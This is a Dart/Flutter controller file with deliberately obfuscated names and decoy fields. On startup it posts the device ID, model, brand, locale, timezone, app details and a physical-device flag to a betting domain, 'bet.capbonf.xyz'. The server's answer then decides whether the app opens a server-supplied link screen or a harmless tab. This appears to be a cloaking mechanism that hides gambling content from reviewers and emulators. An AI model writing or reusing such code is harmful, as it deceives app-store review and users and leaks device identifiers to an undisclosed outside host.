import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var asmlphk = RxBool(false);
  var agxkysjbw = RxBool(true);
  var pmzw = RxString("");
  var regan = RxBool(false);
  var moen = RxBool(true);
  final rvouilwfxd = Dio();


  InAppWebViewController? webViewController;

  void checkNet() async {
    var connectResult = await (Connectivity().checkConnectivity());
    if(connectResult == ConnectivityResult.none){
      Get.toNamed("/noNetwork");
    }
  }

  @override
  void onInit() {
    checkNet();
    super.onInit();
    txlyac();
  }


  Future<void> txlyac() async {

    regan.value = true;
    moen.value = true;
    agxkysjbw.value = false;

    rvouilwfxd.post("https://bet.capbonf.xyz/hXhY3",data: await jzgimuxo()).then((value) {
      var ypne = value.data["ypne"] as String;
      var wfpce = value.data["wfpce"] as bool;
      if (wfpce) {
        pmzw.value = ypne;
        mallie();
      } else {
        pagac();
      }
    }).catchError((e) {
      agxkysjbw.value = true;
      moen.value = true;
      regan.value = false;
    });
  }

  Future<Map<String, dynamic>> jzgimuxo() async {
    final DeviceInfoPlugin wufdanoc = DeviceInfoPlugin();
    PackageInfo rqduk_yfknqpmv = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var anhkjvmu = Platform.localeName;
    var uNxFS = currentTimeZone;

    var VkBMfe = rqduk_yfknqpmv.packageName;
    var ueUOlTcR = rqduk_yfknqpmv.version;
    var upYDU = rqduk_yfknqpmv.buildNumber;

    var qzbYQ = rqduk_yfknqpmv.appName;
    var CNMWxcfg = "";
    var ZoWh = "";
    var darioChristiansen = "";
    var destiniThompson = "";
    var rudolphMills = "";
    var troyReilly = "";
    var annetteSchaden = "";
    var sigurdCasper = "";
    var kameronRussel = "";
    var aurelioWhite = "";

    var ExNCqs  = "";

    var zPpuV = "";
    var kplbZP = false;

    if (GetPlatform.isAndroid) {
      zPpuV = "android";
      var ejpgnrwsfz = await wufdanoc.androidInfo;

      ZoWh = ejpgnrwsfz.brand;

      CNMWxcfg  = ejpgnrwsfz.model;
      ExNCqs = ejpgnrwsfz.id;

      kplbZP = ejpgnrwsfz.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      zPpuV = "ios";
      var ivsbkhg = await wufdanoc.iosInfo;
      ZoWh = ivsbkhg.name;
      CNMWxcfg = ivsbkhg.model;

      ExNCqs = ivsbkhg.identifierForVendor ?? "";
      kplbZP  = ivsbkhg.isPhysicalDevice;
    }
    var res = {
      "upYDU": upYDU,
      "ueUOlTcR": ueUOlTcR,
      "VkBMfe": VkBMfe,
      "kameronRussel" : kameronRussel,
      "CNMWxcfg": CNMWxcfg,
      "uNxFS": uNxFS,
      "annetteSchaden" : annetteSchaden,
      "ZoWh": ZoWh,
      "ExNCqs": ExNCqs,
      "anhkjvmu": anhkjvmu,
      "zPpuV": zPpuV,
      "darioChristiansen" : darioChristiansen,
      "qzbYQ": qzbYQ,
      "kplbZP": kplbZP,
      "destiniThompson" : destiniThompson,
      "rudolphMills" : rudolphMills,
      "sigurdCasper" : sigurdCasper,
      "aurelioWhite" : aurelioWhite,
      "troyReilly" : troyReilly,

    };
    return res;
  }

  Future<void> pagac() async {
    Get.offAllNamed("/linksTab");
  }

  Future<void> mallie() async {
    Get.offAllNamed("/linksGo");
  }

}
